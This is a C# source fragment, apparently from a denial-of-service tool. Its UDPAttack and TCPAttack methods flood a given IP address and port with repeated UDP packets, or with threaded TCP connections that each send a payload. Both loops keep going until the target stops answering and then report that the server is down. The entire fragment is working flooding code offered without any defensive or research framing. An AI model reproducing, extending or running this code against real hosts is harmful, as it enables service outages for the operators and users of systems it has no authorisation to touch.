        static void UDPAttack(string target, string port, string payloadText, bool flag)
        {
            UdpClient client = new UdpClient();

            IPAddress ipAddr = IPAddress.Parse(target);

            client.Connect(ipAddr, int.Parse(port));
            byte[] sendBytes = Encoding.ASCII.GetBytes(payloadText);
            client.AllowNatTraversal(true);
            client.DontFragment = true;

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\nSending UDP packets...");

            while (flag)
            {
                try
                {
                    client.Send(sendBytes, sendBytes.Length);
                }
                catch (Exception exception)
                {
                    flag = false;
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[UDP] Server is down or Invalid address.");
                }
            }
        }
        static void TCPAttack(string target, string port, string payloadText, bool flag)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\nSending TCP packets...");

            for (int i = 0; i < 9999999; i++)
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;

                    while (flag)
                    {
                        try
                        {
                            TcpClient client = new TcpClient();
                            client.NoDelay = true;
                            client.Connect(target, int.Parse(port));
                            StreamWriter stream = new StreamWriter(client.GetStream());
                            stream.Write(payloadText);
                            stream.Flush();
                            client.Close();
                        }
                        catch (Exception exception)
                        {
                            flag = false;
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[TCP] Server is down or Invalid address.");
                        }
                    }
                }).Start();

                while (flag) ;
            }
        }
    }
